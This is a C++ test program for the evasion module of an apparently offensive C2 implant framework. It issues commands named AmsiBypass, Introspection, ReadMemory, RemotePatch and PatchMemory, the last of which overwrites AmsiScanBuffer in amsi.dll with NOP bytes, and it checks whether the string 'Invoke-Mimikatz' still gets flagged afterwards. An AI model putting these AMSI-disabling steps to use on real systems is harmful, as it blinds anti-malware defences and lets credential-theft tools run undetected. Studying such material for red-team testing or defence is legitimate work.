#include "../Evasion.hpp"

#ifdef __linux__
#elif _WIN32
#include <windows.h>
#include <amsi.h>
#pragma comment(lib, "amsi.lib")
#endif

bool testEvasion();

int main()
{
    bool res;

    std::cout << "[+] testEvasion" << std::endl;
    res = testEvasion();
    if (res)
       std::cout << "[+] Sucess" << std::endl;
    else
       std::cout << "[-] Failed" << std::endl;

    return 0;
}


bool testEvasion()
{
    std::unique_ptr<Evasion> evasion = std::make_unique<Evasion>();

#ifdef __linux__
#elif _WIN32
    // {
    //     HRESULT hResult;
    //     HAMSICONTEXT amsi_context;
    //     AMSI_RESULT amsi_result;
    //     HAMSISESSION amsi_session = nullptr;
    //     PCWSTR content = L"Invoke-Mimikatz";
    //     LPCWSTR content_name = L"PowerShell";
    //     ULONG content_size = wcslen(content);

    //     // Initialize AMSI
    //     hResult = AmsiInitialize(L"PowerShell", &amsi_context);
    //     hResult = AmsiOpenSession(amsi_context, &amsi_session);

    //     hResult = AmsiScanBuffer(amsi_context, &content, content_size, content_name, amsi_session, &amsi_result);
    //     // hResult = AmsiScanString(amsi_context, content, content_name, amsi_session, &amsi_result);

    //     // Verify Scan Result
    //     std::cout << "hResult : " << (long)hResult << std::endl;
    //     std::cout << "AMSI RESULT : " << amsi_result << std::endl;
    //     if (amsi_result == AMSI_RESULT_DETECTED) 
    //         std::cout << "Détecté comme malveillant" << std::endl;
    //     else
    //         std::cout << "Non détecté" << std::endl;

    //     std::vector<std::string> splitedCmd;
    //     splitedCmd.push_back("evasion");
    //     splitedCmd.push_back("AmsiBypass");

    //     C2Message c2Message;
    //     C2Message c2RetMessage;
    //     evasion->init(splitedCmd, c2Message);
    //     evasion->process(c2Message, c2RetMessage);

    //     hResult = AmsiScanBuffer(amsi_context, &content, content_size, content_name, amsi_session, &amsi_result);
    //     // hResult = AmsiScanString(amsi_context, content, content_name, amsi_session, &amsi_result);

    //     // Verify Scan Result
    //     std::cout << "hResult : " << (long)hResult << std::endl;
    //     std::cout << "AMSI RESULT : " << amsi_result << std::endl;
    //     if (amsi_result == AMSI_RESULT_DETECTED) 
    //         std::cout << "Détecté comme malveillant" << std::endl;
    //     else
    //         std::cout << "Non détecté" << std::endl;

    //     std::string output = "\n\noutput:\n";
    //     output += c2RetMessage.returnvalue();
    //     output += "\n";
    //     std::cout << output << std::endl;
    // }
    // {
    //     std::vector<std::string> splitedCmd;
    //     splitedCmd.push_back("evasion");
    //     splitedCmd.push_back("Introspection");

    //     C2Message c2Message;
    //     C2Message c2RetMessage;
    //     evasion->init(splitedCmd, c2Message);
    //     evasion->process(c2Message, c2RetMessage);

    //     std::string output = "\n\noutput:\n";
    //     output += c2RetMessage.returnvalue();
    //     output += "\n";
    //     std::cout << output << std::endl;
    // }
    // {
    //     std::vector<std::string> splitedCmd;
    //     splitedCmd.push_back("evasion");
    //     splitedCmd.push_back("Introspection");
    //     splitedCmd.push_back("amsi.dll");

    //     C2Message c2Message;
    //     C2Message c2RetMessage;
    //     evasion->init(splitedCmd, c2Message);
    //     evasion->process(c2Message, c2RetMessage);

    //     std::string output = "\n\noutput:\n";
    //     output += c2RetMessage.returnvalue();
    //     output += "\n";
    //     std::cout << output << std::endl;
    // }
    // {
    //     BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");

    //     std::stringstream ss;
    //     ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << reinterpret_cast<uintptr_t>(baseAddress);
    //     std::string hexString = ss.str();
    //     std::cout << "Base address in hex: " << hexString << std::endl;

    //     std::vector<std::string> splitedCmd;
    //     splitedCmd.push_back("evasion");
    //     splitedCmd.push_back("ReadMemory");
    //     splitedCmd.push_back(hexString);
    //     splitedCmd.push_back("20");

    //     C2Message c2Message;
    //     C2Message c2RetMessage;
    //     evasion->init(splitedCmd, c2Message);
    //     evasion->process(c2Message, c2RetMessage);

    //     std::string output = "\n\noutput:\n";
    //     output += c2RetMessage.returnvalue();
    //     output += "\n";
    //     std::cout << output << std::endl;
    // }
    // {
    //     void * baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");

    //     std::stringstream ss;
    //     ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << reinterpret_cast<uintptr_t>(baseAddress);
    //     std::string hexString = ss.str();
    //     std::cout << "Base address in hex: " << hexString << std::endl;

    //     std::vector<std::string> splitedCmd;
    //     splitedCmd.push_back("evasion");
    //     splitedCmd.push_back("PatchMemory");
    //     splitedCmd.push_back(hexString);
    //     splitedCmd.push_back("\\x90\\x90\\x90\\x90");

    //     C2Message c2Message;
    //     C2Message c2RetMessage;
    //     evasion->init(splitedCmd, c2Message);
    //     evasion->process(c2Message, c2RetMessage);

    //     std::string output = "\n\noutput:\n";
    //     output += c2RetMessage.returnvalue();
    //     output += "\n";
    //     std::cout << output << std::endl;
    // }
    // {
    //     BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");

    //     std::stringstream ss;
    //     ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << reinterpret_cast<uintptr_t>(baseAddress);
    //     std::string hexString = ss.str();
    //     std::cout << "Base address in hex: " << hexString << std::endl;

    //     std::vector<std::string> splitedCmd;
    //     splitedCmd.push_back("evasion");
    //     splitedCmd.push_back("ReadMemory");
    //     splitedCmd.push_back(hexString);
    //     splitedCmd.push_back("20");

    //     C2Message c2Message;
    //     C2Message c2RetMessage;
    //     evasion->init(splitedCmd, c2Message);
    //     evasion->process(c2Message, c2RetMessage);

    //     std::string output = "\n\noutput:\n";
    //     output += c2RetMessage.returnvalue();
    //     output += "\n";
    //     std::cout << output << std::endl;
    // }
    {
        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("evasion");
        splitedCmd.push_back("RemotePatch");

        C2Message c2Message;
        C2Message c2RetMessage;
        evasion->init(splitedCmd, c2Message);
        evasion->process(c2Message, c2RetMessage);

        std::string output = "\n\noutput:\n";
        output += c2RetMessage.returnvalue();
        output += "\n";
        std::cout << output << std::endl;
    }
#endif

    return true;
}